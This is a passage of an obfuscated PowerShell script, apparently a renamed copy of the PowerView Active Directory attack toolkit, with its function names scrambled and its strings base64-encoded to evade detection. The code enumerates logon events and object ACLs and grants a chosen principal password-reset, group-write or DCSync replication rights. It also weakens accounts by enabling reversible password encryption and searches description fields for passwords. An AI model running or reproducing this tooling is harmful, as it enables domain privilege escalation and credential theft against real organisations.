                if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AEEAYwBjAG8AdQBuAHQAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AFMAZQByAHYAaQBjAGUAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAA==')))) {
                    if($Matches) {
                        $Username = $Matches[0].split("" + "`n" + "")[1].split(":")[1].trim()
                        $Domain = $Matches[0].split("" + "`n" + "")[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }
                if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB0AHcAbwByAGsAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AEEAZABkAGkAdABpAG8AbgBhAGwAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAA==')))) {
                    if($Matches) {
                        $Address = $Matches[0].split("" + "`n" + "")[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }
                $LogonEventProperties = @{
                    'Domain' = $Domain
                    'ComputerName' = $ComputerName
                    'Username' = $UserName
                    'Address' = $Address
                    'ID' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3ADYAOAA=')))
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }
                New-Object -TypeName PSObject -Property $LogonEventProperties
            }
            catch {
                Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAGUAdgBlAG4AdAAgAGwAbwBnAHMAOgAgACQAXwA=')))
            }
        }
    }
}
function ErieMoorTheroof {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [String]
        $Name = "*",
        [Alias('DN')]
        [String]
        $DistinguishedName = "*",
        [Switch]
        $ResolveGUIDs,
        [String]
        $Filter,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        $RightsFilter,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $Searcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize
        if($ResolveGUIDs) {
            $GUIDs = ShingToleskirtFloaf -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    process {
        if ($Searcher) {
            if($SamAccountName) {
                $Searcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAD0AJABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAKQAoAG4AYQBtAGUAPQAkAE4AYQBtAGUAKQAoAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA9ACQARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACkAJABGAGkAbAB0AGUAcgApAA==')))  
            }
            else {
                $Searcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbgBhAG0AZQA9ACQATgBhAG0AZQApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJABEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUAKQAkAEYAaQBsAHQAZQByACkA')))  
            }
            try {
                $Searcher.FindAll() | ? {$_} | Foreach-Object {
                    $Object = [adsi]($_.path)
                    if($Object.distinguishedname) {
                        $Access = $Object.PsBase.ObjectSecurity.access
                        $Access | % {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ($Object.distinguishedname[0])
                            if($Object.objectsid[0]){
                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $S = $Null
                            }
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $S
                            $_
                        }
                    }
                } | % {
                    if($RightsFilter) {
                        $GuidFilter = Switch ($RightsFilter) {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                            Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA')))}
                        }
                        if($_.ObjectType -eq $GuidFilter) { $_ }
                    }
                    else {
                        $_
                    }
                } | Foreach-Object {
                    if($GUIDs) {
                        $AclProperties = @{}
                        $_.psobject.properties | % {
                            if( ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) -or ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) ) {
                                try {
                                    $AclProperties[$_.Name] = $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $AclProperties[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $AclProperties[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $AclProperties
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function PoseTrianStular {
    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,
        [String]
        $TargetName = "*",
        [Alias('DN')]
        [String]
        $TargetDistinguishedName = "*",
        [String]
        $TargetFilter,
        [String]
        $TargetADSpath,
        [String]
        $TargetADSprefix,
        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,
        [String]
        $PrincipalName,
        [String]
        $PrincipalSamAccountName,
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $Rights = "All",
        [String]
        $RightsGUID,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $Searcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize
        if(!$PrincipalSID) {
            $Principal = LatedCoidsuckRogues -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            if(!$Principal) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABwAHIAaQBuAGMAaQBwAGEAbAA=')))
            }
            $PrincipalSID = $Principal.objectsid
        }
        if(!$PrincipalSID) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABwAHIAaQBuAGMAaQBwAGEAbAA=')))
        }
    }
    process {
        if ($Searcher) {
            if($TargetSamAccountName) {
                $Searcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAD0AJABUAGEAcgBnAGUAdABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAKQAoAG4AYQBtAGUAPQAkAFQAYQByAGcAZQB0AE4AYQBtAGUAKQAoAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA9ACQAVABhAHIAZwBlAHQARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACkAJABUAGEAcgBnAGUAdABGAGkAbAB0AGUAcgApAA==')))  
            }
            else {
                $Searcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbgBhAG0AZQA9ACQAVABhAHIAZwBlAHQATgBhAG0AZQApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJABUAGEAcgBnAGUAdABEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUAKQAkAFQAYQByAGcAZQB0AEYAaQBsAHQAZQByACkA')))  
            }
            try {
                $Searcher.FindAll() | ? {$_} | Foreach-Object {
                    $TargetDN = $_.Properties.distinguishedname
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
                    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                    $ControlType = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
                    $ACEs = @()
                    if($RightsGUID) {
                        $GUIDs = @($RightsGUID)
                    }
                    else {
                        $GUIDs = Switch ($Rights) {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                        }
                    }
                    if($GUIDs) {
                        foreach($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$NewGUID,$InheritanceType
                        }
                    }
                    else {
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$InheritanceType
                    }
                    Write-Verbose ("Granting principal $PrincipalSID '$Rights' on {0}" -f $($_.Properties.distinguishedname))
                    try {
                        ForEach ($ACE in $ACEs) {
                            Write-Verbose ("Granting principal $PrincipalSID '{0}' rights on {1}" -f $($ACE.ObjectType), $($_.Properties.distinguishedname))
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwByAGEAbgB0AGkAbgBnACAAcAByAGkAbgBjAGkAcABhAGwAIAAkAFAAcgBpAG4AYwBpAHAAYQBsAFMASQBEACAAJwAkAFIAaQBnAGgAdABzACcAIABvAG4AIAAkAFQAYQByAGcAZQB0AEQATgAgADoAIAAkAF8A')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAF8A')))
            }
        }
    }
}
function SadnessesRoyePukullt {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [String]
        $Name = "*",
        [Alias('DN')]
        [String]
        $DistinguishedName = "*",
        [String]
        $Filter,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ResolveGUIDs,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    ErieMoorTheroof @PSBoundParameters | % {
        $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | ? {
        try {
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | ? {
        ($_.ActiveDirectoryRights -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUA')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))
    }
}
function ShingToleskirtFloaf {
    [CmdletBinding()]
    Param (
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    $SchemaPath = (NaeDampGrina).schema.name
    $SchemaSearcher = SuprajesUnderAganger -ADSpath $SchemaPath -DomainController $DomainController -PageSize $PageSize
    if($SchemaSearcher) {
        $SchemaSearcher.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
        try {
            $SchemaSearcher.FindAll() | ? {$_} | % {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAYgB1AGkAbABkAGkAbgBnACAARwBVAEkARAAgAG0AYQBwADoAIAAkAF8A')))
        }      
    }
    $RightsSearcher = SuprajesUnderAganger -ADSpath $SchemaPath.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA')))) -DomainController $DomainController -PageSize $PageSize
    if ($RightsSearcher) {
        $RightsSearcher.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
        try {
            $RightsSearcher.FindAll() | ? {$_} | % {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAYgB1AGkAbABkAGkAbgBnACAARwBVAEkARAAgAG0AYQBwADoAIAAkAF8A')))
        }
    }
    $GUIDs
}
function GrochoniIncunnerMoustic {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',
        [String]
        $SPN,
        [String]
        $OperatingSystem,
        [String]
        $ServicePack,
        [String]
        $Filter,
        [Switch]
        $Printers,
        [Switch]
        $Ping,
        [Switch]
        $FullData,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $Unconstrained,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $CompSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($CompSearcher) {
            if($Unconstrained) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if($Printers) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if($SPN) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAFMAUABOADoAIAAkAFMAUABOAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAkAFMAUABOACkA')))
            }
            if($OperatingSystem) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQA9ACQATwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AKQA=')))
            }
            if($ServicePack) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQBzAGUAcgB2AGkAYwBlAHAAYQBjAGsAPQAkAFMAZQByAHYAaQBjAGUAUABhAGMAawApAA==')))
            }
            $CompSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBBAE0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADkAKQAoAGQAbgBzAGgAbwBzAHQAbgBhAG0AZQA9ACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAKQAkAEYAaQBsAHQAZQByACkA')))
            try {
                $CompSearcher.FindAll() | ? {$_} | % {
                    $Up = $True
                    if($Ping) {
                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if($Up) {
                        if ($FullData) {
                            HaleCiteOzoos -Properties $_.Properties
                        }
                        else {
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAF8A')))
            }
        }
    }
}
function LatedCoidsuckRogues {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,
        [String]
        $Name,
        [String]
        $SamAccountName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $Filter,
        [Switch]
        $ReturnRaw,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if($SID) {
            try {
                $Name = ElminutColatCably $SID
                if($Name) {
                    $Canonical = PlangintsSubrierTernes -ObjectName $Name
                    if($Canonical) {
                        $Domain = $Canonical.split("/")[0]
                    }
                    else {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgACcAJABTAEkARAAnAA==')))
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgACcAJABTAEkARAAnACAAOgAgACQAXwA=')))
                return $Null
            }
        }
        $ObjectSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if($ObjectSearcher) {
            if($SID) {
                $ObjectSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAcwBpAGQAPQAkAFMASQBEACkAJABGAGkAbAB0AGUAcgApAA==')))
            }
            elseif($Name) {
                $ObjectSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbgBhAG0AZQA9ACQATgBhAG0AZQApACQARgBpAGwAdABlAHIAKQA=')))
            }
            elseif($SamAccountName) {
                $ObjectSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAKQAkAEYAaQBsAHQAZQByACkA')))
            }
            $ObjectSearcher.FindAll() | ? {$_} | % {
                if($ReturnRaw) {
                    $_
                }
                else {
                    HaleCiteOzoos -Properties $_.Properties
                }
            }
        }
    }
}
function ThungeCousLable {
    [CmdletBinding()]
    Param (
        [String]
        $SID,
        [String]
        $Name,
        [String]
        $SamAccountName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $Filter,
        [Parameter(Mandatory = $True)]
        [String]
        $PropertyName,
        $PropertyValue,
        [Int]
        $PropertyXorValue,
        [Switch]
        $ClearValue,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    $Arguments = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
    }
    $RawObject = LatedCoidsuckRogues -ReturnRaw @Arguments
    try {
        $Entry = $RawObject.GetDirectoryEntry()
        if($ClearValue) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAGkAbgBnACAAdgBhAGwAdQBlAA==')))
            $Entry.$PropertyName.clear()
            $Entry.commitchanges()
        }
        elseif($PropertyXorValue) {
            $TypeName = $Entry.$PropertyName[0].GetType().name
            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue 
            $Entry.$PropertyName = $PropertyValue -as $TypeName       
            $Entry.commitchanges()     
        }
        else {
            $Entry.put($PropertyName, $PropertyValue)
            $Entry.setinfo()
        }
    }
    catch {
        Write-Warning ("Error setting property $PropertyName to value '$PropertyValue' for object {0} : {1}" -f $($RawObject.Properties.samaccountname), $_)
    }
}
function UnasterryMultingDentad {
    [CmdletBinding()]
    Param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [String]
        $Name,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $Filter,
        [Switch]
        $Repair
    )
    process {
        $Arguments = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
        }
        $UACValues = LatedCoidsuckRogues @Arguments | select useraccountcontrol | HeratedFarmeathyAntark
        if($Repair) {
            if($UACValues.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA==')))) {
                ThungeCousLable @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }
            ThungeCousLable @Arguments -PropertyName pwdlastset -PropertyValue -1
        }
        else {
            if($UACValues.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA==')))) {
                ThungeCousLable @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536
            }
            if($UACValues.Keys -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA==')))) {
                ThungeCousLable @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }
            ThungeCousLable @Arguments -PropertyName pwdlastset -PropertyValue 0
        }
    }
}
function NonsciumEulouslyAph {
    [CmdletBinding()]
    param(
        [String[]]
        $Properties,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if($Properties) {
        $Properties = ,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) + $Properties | sort -Unique
        GrochoniIncunnerMoustic -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | select -Property $Properties
    }
    else {
        GrochoniIncunnerMoustic -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | select -first 1 | gm -MemberType *Property | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))
    }
}
function BypJeddleLoate {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = 'pass',
        [Alias('Field')]
        [String]
        $SearchField = 'description',
        [String]
        $ADSpath,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        GrochoniIncunnerMoustic -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAkAFMAZQBhAHIAYwBoAEYAaQBlAGwAZAA9ACoAJABTAGUAYQByAGMAaABUAGUAcgBtACoAKQA='))) -PageSize $PageSize | select samaccountname,$SearchField
    }
}
function OrchaniseCripterCilous {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = '*',
        [String]
        $GUID,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $OUSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($OUSearcher) {
            if ($GUID) {
